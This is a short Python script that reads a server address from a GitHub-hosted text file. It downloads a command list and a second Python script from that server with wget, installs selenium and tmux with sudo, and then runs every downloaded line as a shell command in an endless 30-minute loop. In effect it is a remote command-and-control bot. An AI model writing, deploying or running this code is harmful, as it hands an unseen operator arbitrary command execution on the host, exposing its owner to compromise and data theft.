import time
import requests
import os
url = "https://raw.githubusercontent.com/petxir/7641de1963f0c6a475f4e802cfcb870d/refs/heads/main/pepek.txt"
dataurl = requests.get(url)
os.system("wget -O l.txt "+dataurl.text+"/xyz/web/action.php?command=1")
os.system("wget "+dataurl.text+"/xyz/xyz.py")
os.system("pip install selenium")
os.system("sudo apt-get update -y")
os.system("sudo apt-get install tmux -y")
while True:
    with open("l.txt", "r", encoding="utf-8") as file:
        for line in file:
            os.system(line.strip())
    time.sleep(1800)
    os.system("tmux kill-server")
    time.sleep(10)
